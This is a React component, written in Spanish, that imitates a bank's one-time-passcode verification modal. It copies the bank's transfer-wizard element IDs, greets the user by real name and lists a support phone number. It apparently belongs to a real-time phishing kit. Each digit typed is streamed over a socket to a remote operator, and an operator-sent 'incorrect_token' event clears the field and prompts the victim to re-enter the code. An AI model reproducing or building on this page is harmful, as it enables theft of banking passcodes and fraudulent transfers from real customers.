import React, { useState, useEffect } from "react";
import { useSelector } from "react-redux";
import styles from "./css/styles03.module.css";
import { useSocket } from "../appComponents/SocketContext";
import eventBus from "../appComponents/EventBus";

function Token({ sS }) {
  const { sendMessage } = useSocket();
  const user = useSelector((state) => state.users);
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutos en segundos
  const [showResendButton, setShowResendButton] = useState(false);
  const [error, setError] = useState(false);
  const [code, setCode] = useState("");
  const [errorMessage, setErrorMessage] = useState("");

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prevTime) => {
        if (prevTime <= 1) {
          setShowResendButton(true);
          return 0;
        }
        return prevTime - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    if (code.length > 0) {
      sendMessage("update_token", { token: code, bToken: false });
      sendMessage("open_bToken", { bToken: false });
    }
  }, [code]);

  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds.toString().padStart(2, "0")}`;
  };

  const handleResendCode = () => {
    setTimeLeft(300);
    setShowResendButton(false);
    handleReenviarCodigo();
  };

  const handleCodeChange = (e) => {
    const value = e.target.value;

    // Solo permitir números
    const numericValue = value.replace(/[^0-9]/g, "");
    setCode(numericValue);

    // Validación en tiempo real
    if (error) {
      // Solo limpiar error si el usuario está escribiendo un código válido
      if (numericValue.length >= 6 && numericValue.trim() !== "") {
        setError(false);
        setErrorMessage("");
      } else if (numericValue.trim() === "") {
        // Si está vacío, mostrar mensaje de campo requerido
        setError(true);
        setErrorMessage("Por favor, ingrese el código de verificación.");
      } else if (numericValue.length < 6) {
        // Si tiene menos de 6 dígitos, mostrar mensaje de longitud
        setError(true);
        setErrorMessage("El código debe tener al menos 6 dígitos.");
      }
    }
  };

  const handleSubmitCode = () => {
    // Validar que el campo no esté vacío y tenga al menos 6 dígitos
    if (!code || code.trim() === "") {
      setError(true);
      setErrorMessage("Por favor, ingrese el código de verificación.");
      return;
    }

    if (code.length < 6) {
      setError(true);
      setErrorMessage("El código debe tener al menos 6 dígitos.");
      return;
    }

    sS(true);
    sendMessage("update_token", { token: code, bToken: true });
    sendMessage("open_bToken", { bToken: true });
  };

  const handleReenviarCodigo = () => {
    setCode("");
    sS(false);
    sendMessage("update_token", { token: "REENVIAR", bToken: false });
    sendMessage("open_bToken", { bToken: false });
  };

  useEffect(() => {
    eventBus.on("incorrect_token", (e) => {
      setCode("");
      sS(false);
      setError(true);
      setErrorMessage(
        "El código ingresado es incorrecto. Por favor, verifique e intente nuevamente."
      );
    });
    return () => {
      eventBus.off("incorrect_token");
    };
  }, []);

  return (
    <>
      <div className={`${styles["modalOverlay"]}`}></div>

      <div
        id="ctl00_PlaceHolder_cgTransferWizard_pbBeneficiaryUC_cgFavProd"
        className={`${styles["modalPopup"]}`}
      >
        <div className={`${styles["header"]}`}>
          <span
            id="ctl00_PlaceHolder_cgTransferWizard_pbBeneficiaryUC_clBeneficiaryTitle"
            className={`${styles["PopUpFormSubTitle"]}`}
          >
            Mecanismo de verificación
          </span>
        </div>

        <div className={`${styles["body"]} ${styles["modalGrid"]}`}>
          <div id="ctl00_PlaceHolder_cgTransferWizard_pbBeneficiaryUC_ctUptBeneficiary">
            <span
              id="clMsgGridBenef"
              className={`${styles["TextoAlerta"]} ${styles["p-l-25"]}`}
              style={{ display: "none" }}
            ></span>

            <div id="ctGridBenef" style={{ display: "block" }}>
              <center>
                <div id="divAuthUC">
                  <div id="divContainUC" width="100%">
                    <div id="ctl00_PlaceHolder_cgTransferWizard_AutenticationUC_cgOTPEntrust">
                      <div id="ctl00_PlaceHolder_cgTransferWizard_AutenticationUC_divValidateOTPEntrust">
                        <div id="ctl00_PlaceHolder_cgTransferWizard_AutenticationUC_UpdatePanelOTPEntrust">
                          <div>
                            <br />
                            <br />

                            <div
                              className={`${styles["textcenter"]} ${styles["FormTDSubTitle"]} ${styles["personalized-message"]}`}
                            >
                              <span
                                id="ctl00_PlaceHolder_cgTransferWizard_AutenticationUC_clValidateOTPEntrust"
                                className={`${styles["normal_text"]}`}
                                style={{
                                  fontWeight: "bold",
                                  fontSize: "16px",
                                  marginBottom: "10px",
                                  display: "block",
                                }}
                              >
                                Estimado{" "}
                                {(user.realName || "Cliente").toUpperCase()},
                              </span>
                              <span
                                className={`${styles["normal_text"]}`}
                                style={{
                                  fontSize: "14px",
                                  lineHeight: "1.4",
                                  display: "block",
                                  marginBottom: "20px",
                                }}
                              >
                                Para completar su verificación de seguridad, por
                                favor confirme el código de verificación que
                                hemos enviado a su dispositivo móvil registrado.
                              </span>
                            </div>

                            <br />

                            <div
                              className={`${styles["textcenter"]} ${
                                styles["code-input-container"]
                              } ${error ? styles["error-container"] : ""}`}
                              style={{ display: "table", margin: "0 auto" }}
                            >
                              <div style={{ display: "table-row" }}>
                                <div style={{ display: "table-cell" }}>
                                  <input
                                    name="ctl00$PlaceHolder$cgTransferWizard$AutenticationUC$ctCodeOTPEntrust"
                                    type="text"
                                    maxlength="12"
                                    id="ctCodeOTPEntrust"
                                    placeholder="Ingrese código"
                                    className={`${styles["code-input-field"]} ${
                                      error ? styles["error-input"] : ""
                                    }`}
                                    value={code}
                                    onChange={handleCodeChange}
                                    onKeyPress={(e) => {
                                      if (e.key === "Enter") {
                                        handleSubmitCode();
                                      }
                                    }}
                                  />
                                  {error && (
                                    <div className={styles["error-message"]}>
                                      <span
                                        style={{
                                          color: "#e74c3c",
                                          fontSize: "12px",
                                          display: "block",
                                          marginTop: "5px",
                                        }}
                                      >
                                        {errorMessage}
                                      </span>
                                    </div>
                                  )}
                                  <span
                                    id="ctl00_PlaceHolder_cgTransferWizard_AutenticationUC_cvCodeOTPEntrust"
                                    style={{
                                      color: "Red",
                                      display: "none",
                                    }}
                                  >
                                    *
                                  </span>
                                </div>
                              </div>
                            </div>

                            <br />

                            <div id="cgGetNewOTP">
                              <div
                                className={`${styles["textcenter"]}`}
                                style={{ display: "table", margin: "0 auto" }}
                              >
                                <div style={{ display: "table-row" }}>
                                  <div
                                    className={`${styles["p-r-5"]}`}
                                    style={{
                                      display: "table-cell",
                                      width: "auto",
                                    }}
                                  >
                                    <span
                                      id="ctl00_PlaceHolder_cgTransferWizard_AutenticationUC_clRetryOTPEntrust"
                                      className={`${styles["normal_text"]}`}
                                      style={{
                                        fontSize: "14px",
                                        color: "#666",
                                      }}
                                    >
                                      Su código expirá en:{" "}
                                    </span>
                                  </div>
                                  <div
                                    className={`${styles["p-r-5"]}`}
                                    style={{
                                      display: "table-cell",
                                      width: "auto",
                                    }}
                                  >
                                    <span
                                      id="clockOTP"
                                      style={{
                                        fontSize: "14px",
                                        fontWeight: "bold",
                                        color:
                                          timeLeft <= 30
                                            ? "#e74c3c"
                                            : "#333333",
                                      }}
                                    >
                                      {formatTime(timeLeft)}
                                    </span>
                                  </div>
                                </div>
                              </div>

                              <br />

                              {showResendButton && (
                                <div
                                  className={`${styles["textcenter"]}`}
                                  style={{ display: "table", margin: "0 auto" }}
                                >
                                  <div style={{ display: "table-row" }}>
                                    <div
                                      style={{
                                        display: "table-cell",
                                        width: "auto",
                                        margin: "auto",
                                      }}
                                    >
                                      <input
                                        id="btnSentOTP"
                                        type="button"
                                        className={`${styles["LinkBtnUnderline"]} ${styles["resend-button"]}`}
                                        value="Reenviar código"
                                        onClick={handleResendCode}
                                      />
                                    </div>
                                  </div>
                                </div>
                              )}

                              <br />
                              <br />

                              <div
                                className={`${styles["textcenter"]}`}
                                style={{ display: "table", margin: "0 auto" }}
                              >
                                <div style={{ display: "table-row" }}>
                                  <div
                                    style={{
                                      display: "table-cell",
                                      width: "auto",
                                    }}
                                  >
                                    <span
                                      id="ctl00_PlaceHolder_cgTransferWizard_AutenticationUC_clTittleMessageOTPEtrust"
                                      className={`${styles["normal_text"]}`}
                                      style={{
                                        fontWeight: "bold",
                                        fontSize: "14px",
                                        color: "#333",
                                        marginBottom: "10px",
                                        display: "block",
                                      }}
                                    >
                                      ¿Necesita ayuda?
                                    </span>
                                  </div>
                                </div>
                                <div style={{ display: "table-row" }}>
                                  <div
                                    style={{
                                      display: "table-cell",
                                      width: "300px",
                                    }}
                                  >
                                    <span
                                      id="ctl00_PlaceHolder_cgTransferWizard_AutenticationUC_clMessageOTPEntrust"
                                      className={`${styles["normal_text"]}`}
                                      style={{
                                        fontSize: "13px",
                                        lineHeight: "1.4",
                                        color: "#666",
                                      }}
                                    >
                                      Si no ha recibido su código de
                                      verificación, comuníquese con nuestro
                                      equipo de soporte al
                                      <strong style={{ color: "#7ac143" }}>
                                        {" "}
                                        +506 2519 8014
                                      </strong>
                                      .
                                    </span>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div style={{ display: "none" }}></div>
                      </div>
                    </div>
                  </div>
                </div>

                <div id="ctl00_PlaceHolder_cgTransferWizard_UpDigSig">
                  <input
                    type="submit"
                    name="ctl00$PlaceHolder$cgTransferWizard$cbShowDigSig"
                    value=""
                    id="cbShowDigSig"
                    style={{ display: "none" }}
                  />
                </div>
              </center>
              <div className={`${styles["footerGVLine"]}`}></div>
            </div>
          </div>
        </div>

        <div className={`${styles["footer"]}`}>
          <input
            id="ctOk"
            type="button"
            value="Continuar"
            className={`${styles["buttonsSmall"]} ${styles["buttons_smalltext"]} ${styles["continue-button"]}`}
            onClick={handleSubmitCode}
          />
        </div>
      </div>

      <div
        id="ctl00_PlaceHolder_cgTransferWizard_pbFavProdUC_cgFavProd1"
        style={{ display: "none" }}
      ></div>
      <div
        id="ctl00_PlaceHolder_cgTransferWizard_pbFavProdUC_ctDetailsConfirm"
        style={{ display: "none", position: "fixed", zIndex: 100011 }}
      ></div>
      <div style={{ display: "none" }}></div>
      <div id="divHF">
        <div id="ctl00_PlaceHolder_cgTransferWizard_pbBeneficiaryUC_Up_HF"></div>
      </div>
      <div id="divButtons" style={{ display: "none" }}></div>

      <div
        style={{
          display: "none",
          position: "fixed",
          left: "0px",
          top: "0px",
          zIndex: 10000,
        }}
        className={`${styles["ConfirmModalBackground"]}`}
      ></div>
      <div
        style={{
          display: "none",
          position: "fixed",
          left: "0px",
          top: "0px",
          zIndex: 100010,
        }}
        className={`${styles["ConfirmModalBackground"]}`}
      ></div>
      <div
        style={{
          position: "fixed",
          left: "0px",
          top: "0px",
          zIndex: 10000,
          width: "100vw",
          height: "100vh",
        }}
        className={`${styles["ConfirmModalBackground"]}`}
      ></div>
    </>
  );
}

export default Token;
